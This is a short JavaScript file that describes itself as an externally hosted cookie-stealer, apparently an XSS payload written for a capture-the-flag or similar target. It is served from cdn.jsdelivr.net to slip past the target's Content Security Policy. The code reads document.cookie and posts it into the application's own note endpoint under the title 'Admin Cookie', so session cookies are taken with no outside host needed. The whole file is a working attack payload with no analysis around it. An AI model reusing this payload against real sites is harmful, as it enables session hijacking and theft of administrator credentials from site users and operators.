/**
 * Simple, externally-hosted cookie-stealer. 
 * - I used cdn.jsdelivr.net because it was allowed by target's CSP
 */

const data = JSON.stringify({
  title: 'Admin Cookie',
  content: document.cookie,
  submit: 'save',
});

const y = new XMLHttpRequest();

y.open('POST', '/note/new', true);
y.setRequestHeader('Content-type', 'application/json');
y.send(data);
